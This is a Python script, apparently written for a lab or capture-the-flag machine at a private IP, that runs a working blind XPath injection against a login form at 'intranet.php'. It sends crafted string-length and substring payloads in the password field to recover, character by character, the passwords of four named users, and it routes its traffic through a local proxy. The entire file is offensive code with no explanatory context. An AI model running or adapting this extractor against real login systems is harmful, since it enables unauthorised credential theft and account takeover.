
import requests

users = ['bryan', 'sarah', 'rita', 'jim']
chars = "abcdefghijklmnopqrstuvwxyz1234567890{}_()!@"

proxies = { 'http':'http://127.0.0.1:8080' }

def get_length(username):
    for i in range(0,33):
        payload = f"' or Username='{username}' and string-length(Password/text())={i} or '2'='1"
        data= { 'Username':'', 'Password':payload }
        r = requests.post("http://172.31.179.1/intranet.php", data=data, proxies=proxies)
        if "credentials" not in r.text:
            return i

def brute(username, pos):
    for char in chars:
        payload = f"' or Username='{username}' and substring(Password,{pos},1)='{char}"
        data= { 'Username':'', 'Password':payload }
        r = requests.post("http://172.31.179.1/intranet.php", data=data, proxies=proxies)
        if "credentials" not in r.text:
            return char
    return False

for user in users:
    pw_length = ""
    pw_char = ""
    pw_length = get_length(user)
    print("Password Length for the {user} is {pw_length}".format(user=user, pw_length=pw_length))
    print("And... the password is: ", end="", flush=True)

    for i in range(1, pw_length+1):
        pw_char = brute(user, i)
        if not pw_char:
            print("Character no in chars")
        print(pw_char, end="", flush=True)
